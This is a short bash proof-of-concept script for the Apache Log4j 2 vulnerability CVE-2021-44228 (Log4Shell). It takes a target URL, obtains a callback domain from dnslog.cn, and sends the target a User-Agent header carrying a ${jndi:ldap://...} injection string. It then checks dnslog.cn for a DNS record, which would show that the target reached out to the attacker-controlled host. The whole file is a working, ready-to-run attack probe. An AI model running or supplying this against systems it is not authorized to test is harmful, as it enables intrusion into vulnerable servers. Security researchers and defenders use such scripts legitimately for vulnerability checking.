##########################################################################
# File Name: log4j-poc.sh
# Author: Anaïs Huang
# mail: anaishuangc0conut@gmail.com
# Created Time: Sat 11 Dec 2021 04:16:37 PM CST
#########################################################################
#!/bin/bash

# param process
while getopts ":u:h" cliName; do
	case "${cliName}" in
		h)
			echo -e "CVE-2021-44228 is a remote code execution (RCE) vulnerability in Apache Log4j 2.\nThe impacted version: 2.0 <= Apache log4j2 <= 2.14.1"
			echo -e "This is a poc for it."
			echo -e "Usage:\n\t-u [url of the target]\n\t-h help"
			exit
			;;
		u)
			url=${OPTARG}
			;;
		:)
			echo -e "No agrument value for option $OPTARG\nExit."
			exit
			;;
		*)
			echo -e "Unknown option $OPTARG\nExit."
			exit
			;;
	esac
done

# get short domain name from dnslog
# cookie: \b(PHPSESSID=[0-9a-zA-Z]*;)
# domain name: ^[0-9a-z]*.dnslog.cn
shortDomain=`curl -c cookie.txt -s http://www.dnslog.cn/getdomain.php`
echo -n "short domain: "
echo ${shortDomain}""
# send poc in the GET header to target
poc=`printf 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0\${jndi:ldap://%s}' ${shortDomain}`
echo "poc: ${poc}"
curl -i --user-agent "${poc}" -v ${url}

# sleep for 60s
sleep 60

# check record
curl -b cookie.txt -v http://www.dnslog.cn/getrecords.php
